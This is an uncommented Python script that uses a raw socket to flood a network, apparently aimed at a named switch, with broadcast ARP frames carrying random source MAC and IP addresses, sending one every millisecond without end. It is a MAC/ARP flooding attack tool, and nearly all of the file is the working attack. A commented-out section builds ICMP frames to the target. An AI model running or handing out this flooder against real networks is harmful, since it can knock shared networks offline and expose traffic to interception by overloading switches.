#!/usr/bin/python

import sys
import socket
import time
import random
import binascii

from socket import  AF_PACKET, SOCK_RAW

charset = [chr(i) for i in range(ord('0'),ord('9')+1)]
charset.extend([chr(i) for i in range(ord('a'),ord('f')+1)])

def random_mac():
    return ':'.join([''.join([charset[random.randint(0,len(charset)-1)] for _ in range(2)]) for _ in range(6)])

def random_ip():
    return ''.join([charset[random.randint(0,len(charset)-1)] for _ in range(8)])


if len(sys.argv)<2:
    print("Usage : "+sys.argv[0]+" [target switch mac] [interface connect network]")

interface = sys.argv[2]

src_mac_address = random_mac()
dst_mac_address = sys.argv[1]
broadcast_mac = 'ff:ff:ff:ff:ff:ff'
src_ip = random_ip()
dst_ip = '0a000001'

s = socket.socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))


while (True):
    eth_pkt = broadcast_mac.replace(':','')+src_mac_address.replace(':','')+"08060001080006040001"+src_mac_address.replace(':','')+src_ip+"000000000000"+dst_ip
    eth_pkt = binascii.unhexlify(eth_pkt)

    s.send(eth_pkt)
    time.sleep(0.001)

    # eth_pkt = dst_mac_address.replace(':','')+src_mac_address.replace(':','')+"0800450000547c6a40004001cc59"+src_ip+dst_ip+"08000a0000010001a5bf1c58000000006327070000000000101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637"
    # eth_pkt = binascii.unhexlify(eth_pkt)
    #
    # s.send(eth_pkt)
    # time.sleep(5)
